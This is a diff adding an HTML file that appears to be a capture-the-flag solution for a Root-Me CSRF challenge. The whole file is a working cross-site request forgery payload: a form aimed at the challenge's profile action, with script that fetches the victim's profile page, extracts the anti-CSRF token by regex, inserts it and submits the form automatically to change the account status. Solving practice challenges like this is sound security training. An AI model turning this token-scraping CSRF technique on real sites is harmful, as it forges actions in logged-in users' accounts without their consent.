@@ -1,0 +1,15 @@
+<form id="profile" action="http://challenge01.root-me.org/web-client/ch23/?action=profile" method="post" enctype="multipart/form-data">
+    <input id="username" type="text" name="username" value="thanhloi">
+    <input id="status" type="checkbox" name="status" checked>
+    <input id="token" type="hidden" name="token" value="1729924a5cab6e9fbaff98c0f08455f0">
+    <button type="submit">Submit</button>
+    </form>
+<script>
+    var xhttp=new XMLHttpRequest();
+    xhttp.open("GET", "http://challenge01.root-me.org/web-client/ch23/?action=profile", false);
+    xhttp.send();
+    var html_profile=xhttp.responseText
+    var token=html_profile.match(/\w{32}/);
+    document.getElementById("token").setAttribute("value",token[0]);
+    document.getElementById("profile").submit();
+</script>
